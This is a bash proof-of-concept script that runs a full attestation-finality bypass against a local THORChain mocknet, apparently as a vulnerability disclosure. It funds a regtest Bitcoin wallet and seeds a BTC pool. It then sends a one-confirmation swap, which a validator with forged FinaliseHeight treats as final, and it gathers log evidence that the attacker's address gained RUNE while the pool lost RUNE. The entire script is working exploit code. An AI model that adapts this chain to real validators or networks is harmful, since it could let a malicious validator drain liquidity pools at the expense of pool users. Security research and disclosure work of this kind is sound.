#!/bin/bash
# Attestation Finality Bypass PoC
# This script demonstrates the complete attack chain on a running mocknet.
# Prerequisites: mocknet-cluster already running with all 4 validators Active.
set -euo pipefail

THORNODE_API="http://localhost:1317"
BTC_CLI="docker exec docker-bitcoin-1 bitcoin-cli -regtest -rpcuser=thorchain -rpcpassword=password"
THORNODE_EXEC="docker exec -e SIGNER_PASSWD=password docker-thornode-1"
ATTACKER_ADDR="tthor1zf3gsk7edzwl9syyefvfhle37cjtql35h6k85m"

log() { echo "[$(date +%H:%M:%S)] $*"; }

############################################################
# Phase 0 – Sanity checks
############################################################
log "Phase 0: Sanity checks"
ACTIVE=$(curl -sf "$THORNODE_API/thorchain/nodes" | python3 -c "import sys,json; print(sum(1 for n in json.load(sys.stdin) if n['status']=='Active'))")
if [ "$ACTIVE" -lt 1 ]; then
  echo "ERROR: No active validators. Start the mocknet first."
  exit 1
fi
log "  Active validators: $ACTIVE"

# Verify FORGE_FINALITY env separation
DOG_FF=$(docker exec docker-thornode-1 printenv FORGE_FINALITY 2>/dev/null || echo "unset")
log "  dog FORGE_FINALITY=$DOG_FF"
for node in cat fox pig; do
  FF=$(docker exec "docker-thornode-${node}-1" printenv FORGE_FINALITY 2>/dev/null || echo "unset")
  log "  $node FORGE_FINALITY='$FF'"
done

# Get vault address
VAULT_BTC=$(curl -sf "$THORNODE_API/thorchain/inbound_addresses" | python3 -c "
import sys,json
for d in json.load(sys.stdin):
    if d['chain']=='BTC':
        print(d['address'])
        break
" 2>/dev/null)
if [ -z "$VAULT_BTC" ]; then
  echo "ERROR: No BTC vault address. BTC chain may be halted."
  exit 1
fi
log "  BTC vault: $VAULT_BTC"

############################################################
# Phase 1 – Ensure BTC wallet has funds
############################################################
log "Phase 1: Fund BTC wallet"
MASTER_BTC=$($BTC_CLI getnewaddress 2>/dev/null)
BALANCE=$($BTC_CLI getbalance 2>/dev/null)
if [ "$(python3 -c "print(1 if float('$BALANCE') < 50 else 0)")" = "1" ]; then
  log "  Mining 200 blocks to fund wallet..."
  $BTC_CLI generatetoaddress 200 "$MASTER_BTC" > /dev/null 2>&1
  BALANCE=$($BTC_CLI getbalance 2>/dev/null)
fi
log "  BTC wallet balance: $BALANCE"

############################################################
# Phase 2 – Initialize BTC.BTC pool
############################################################
log "Phase 2: Initialize BTC.BTC pool"
POOL_STATUS=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('status','none'))" 2>/dev/null || echo "none")

if [ "$POOL_STATUS" != "Available" ] || [ "$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" | python3 -c "import sys,json; print(json.load(sys.stdin).get('balance_asset','0'))")" = "0" ]; then
  log "  Sending RUNE-side ADD..."
  $THORNODE_EXEC sh -c "echo \"\$SIGNER_PASSWD\" | thornode tx thorchain deposit 1000000000000 THOR.RUNE \"ADD:BTC.BTC:${MASTER_BTC}\" --from thorchain --keyring-backend file --chain-id thorchain --yes --fees 2000000rune" > /dev/null 2>&1

  log "  Sending BTC-side ADD (10 BTC)..."
  MEMO="ADD:BTC.BTC:${ATTACKER_ADDR}"
  MEMO_HEX=$(echo -n "$MEMO" | xxd -p | tr -d '\n')

  # Use fundrawtransaction to auto-select UTXOs and calculate change
  RAW=$($BTC_CLI createrawtransaction '[]' "[{\"$VAULT_BTC\":10.0},{\"data\":\"$MEMO_HEX\"}]")
  FUNDED=$($BTC_CLI fundrawtransaction "$RAW" '{"feeRate": 0.0001}' | python3 -c "import sys,json; print(json.load(sys.stdin)['hex'])")
  SIGNED=$($BTC_CLI signrawtransactionwithwallet "$FUNDED" | python3 -c "import sys,json; print(json.load(sys.stdin)['hex'])")
  ADD_TXID=$($BTC_CLI sendrawtransaction "$SIGNED")
  log "  BTC ADD tx: $ADD_TXID"

  # Mine blocks and wait for pool (bifrost scan can take several minutes)
  log "  Waiting for pool to initialize (up to 10 minutes)..."
  for i in $(seq 1 200); do
    $BTC_CLI generatetoaddress 2 "$MASTER_BTC" > /dev/null 2>&1
    POOL_OK=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" 2>/dev/null | python3 -c "
import sys,json; d=json.load(sys.stdin)
print('1' if d.get('status')=='Available' and d.get('balance_asset','0')!='0' else '0')" 2>/dev/null || echo "0")
    if [ "$POOL_OK" = "1" ]; then log "  Pool initialized at iteration $i"; break; fi
    if [ $((i % 10)) -eq 0 ]; then log "  Still waiting... (iteration $i/200)"; fi
    sleep 3
  done
fi

# Verify pool is ready before continuing
POOL_ASSET_CHECK=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('balance_asset','0'))" 2>/dev/null || echo "0")
if [ "$POOL_ASSET_CHECK" = "0" ]; then
  log "ERROR: Pool failed to initialize. Re-run the script (bifrost may need more time to scan)."
  exit 1
fi

POOL_RUNE=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" | python3 -c "import sys,json; print(json.load(sys.stdin)['balance_rune'])")
POOL_ASSET=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" | python3 -c "import sys,json; print(json.load(sys.stdin)['balance_asset'])")
log "  Pool ready: rune=$POOL_RUNE asset=$POOL_ASSET"

############################################################
# Phase 3 – Record pre-attack state
############################################################
log "Phase 3: Record pre-attack state"
PRE_RUNE=$(curl -sf "$THORNODE_API/cosmos/bank/v1beta1/balances/$ATTACKER_ADDR" | python3 -c "
import sys,json; balances=json.load(sys.stdin).get('balances',[])
print(next((b['amount'] for b in balances if b['denom']=='rune'), '0'))")
log "  Attacker RUNE balance: $PRE_RUNE"
log "  Pool rune=$POOL_RUNE asset=$POOL_ASSET"

############################################################
# Phase 4 – Send attack transaction (1 BTC swap)
############################################################
log "Phase 4: Send attack BTC swap (1 BTC -> RUNE)"
MEMO="=:THOR.RUNE:${ATTACKER_ADDR}"
MEMO_HEX=$(echo -n "$MEMO" | xxd -p | tr -d '\n')

# Use fundrawtransaction to auto-select UTXOs
RAW=$($BTC_CLI createrawtransaction '[]' "[{\"$VAULT_BTC\":1.0},{\"data\":\"$MEMO_HEX\"}]")
FUNDED=$($BTC_CLI fundrawtransaction "$RAW" '{"feeRate": 0.0001}' | python3 -c "import sys,json; print(json.load(sys.stdin)['hex'])")
SIGNED=$($BTC_CLI signrawtransactionwithwallet "$FUNDED" | python3 -c "import sys,json; print(json.load(sys.stdin)['hex'])")

# Mine exactly 1 block (need 10+ for finality -> attack tx will be non-final)
ATTACK_TXID=$($BTC_CLI sendrawtransaction "$SIGNED")
$BTC_CLI generatetoaddress 1 "$MASTER_BTC" > /dev/null 2>&1
ATTACK_TXID_UPPER=$(echo "$ATTACK_TXID" | tr 'a-f' 'A-F')
log "  Attack TX: $ATTACK_TXID_UPPER"
CONFS=$($BTC_CLI gettransaction "$ATTACK_TXID" | python3 -c "import sys,json; print(json.load(sys.stdin)['confirmations'])")
log "  Confirmations: $CONFS (need 10+ for finality)"

############################################################
# Phase 5 – Wait for exploit & swap execution
############################################################
log "Phase 5: Waiting for exploit to trigger..."
SWAP_FOUND=0
for i in $(seq 1 120); do
  if docker logs docker-thornode-1 2>&1 | grep -q "receive MsgSwap.*$ATTACK_TXID_UPPER"; then
    SWAP_FOUND=1
    log "  SWAP EXECUTED at iteration $i!"
    break
  fi
  sleep 2
done

if [ "$SWAP_FOUND" = "0" ]; then
  log "ERROR: Swap not executed within timeout."
  exit 1
fi

# Let outbound settle
sleep 5

############################################################
# Phase 6 – Collect evidence
############################################################
log ""
log "============================================"
log "      EVIDENCE CHAIN"
log "============================================"
log ""

log "--- Evidence 1: Bifrost sends non-final attestation ---"
docker logs docker-bifrost-1 2>&1 | grep "sent quorum tx" | grep "$ATTACK_TXID_UPPER" | grep "final: false" | head -1 || log "  (non-final attestation may have been quickly superseded)"
echo ""

log "--- Evidence 2: Bifrost confirmation check ---"
docker logs docker-bifrost-1 2>&1 | grep "confirmation count" | grep "ready=false" | tail -3 || log "  (no ready=false logs found; tx may have reached required confs quickly)"
echo ""

log "--- Evidence 3: Dog forges FinaliseHeight ---"
docker logs docker-thornode-1 2>&1 | grep "forged FinaliseHeight" | grep "$ATTACK_TXID_UPPER" | head -1 || log "  (forge happened before log rotation or tx was immediately forged)"
echo ""

log "--- Evidence 4: Injected as finalized=true ---"
docker logs docker-thornode-1 2>&1 | grep "Injecting quorum tx" | grep "$ATTACK_TXID_UPPER" | head -1 || log "  (injection log not found)"
echo ""

log "--- Evidence 5: Swap executed ---"
docker logs docker-thornode-1 2>&1 | grep "receive MsgSwap" | grep "$ATTACK_TXID_UPPER" | head -1 || log "  (swap log not found)"
echo ""

log "--- Evidence 6: TX status (outbound) ---"
curl -sf "$THORNODE_API/thorchain/tx/status/$ATTACK_TXID_UPPER" | python3 -c "
import sys,json
d = json.load(sys.stdin)
print(f'  Stages: inbound_finalised={d[\"stages\"][\"inbound_finalised\"][\"completed\"]}, swap_finalised={d[\"stages\"][\"swap_finalised\"][\"completed\"]}')
if d.get('out_txs'):
    out = d['out_txs'][0]
    print(f'  Outbound: {out[\"coins\"][0][\"amount\"]} {out[\"coins\"][0][\"asset\"]} -> {out[\"to_address\"]}')
if d.get('planned_out_txs'):
    p = d['planned_out_txs'][0]
    print(f'  Planned: {p[\"coin\"][\"amount\"]} {p[\"coin\"][\"asset\"]} -> {p[\"to_address\"]}')
" 2>/dev/null
echo ""

log "--- Evidence 7: Post-attack state ---"
POST_RUNE=$(curl -sf "$THORNODE_API/cosmos/bank/v1beta1/balances/$ATTACKER_ADDR" | python3 -c "
import sys,json; balances=json.load(sys.stdin).get('balances',[])
print(next((b['amount'] for b in balances if b['denom']=='rune'), '0'))")
POST_POOL_RUNE=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" | python3 -c "import sys,json; print(json.load(sys.stdin)['balance_rune'])")
POST_POOL_ASSET=$(curl -sf "$THORNODE_API/thorchain/pool/BTC.BTC" | python3 -c "import sys,json; print(json.load(sys.stdin)['balance_asset'])")

RUNE_GAINED=$(python3 -c "print(int('$POST_RUNE') - int('$PRE_RUNE'))")
POOL_RUNE_LOST=$(python3 -c "print(int('$POOL_RUNE') - int('$POST_POOL_RUNE'))")

log "  Attacker RUNE: $PRE_RUNE -> $POST_RUNE (gained: $RUNE_GAINED)"
log "  Pool RUNE: $POOL_RUNE -> $POST_POOL_RUNE (lost: $POOL_RUNE_LOST)"
log "  Pool BTC:  $POOL_ASSET -> $POST_POOL_ASSET"
echo ""

log "============================================"
log "  CONCLUSION: Finality bypass confirmed."
log "  The swap was executed and funds moved"
log "  while BTC source tx was non-final."
log "============================================"
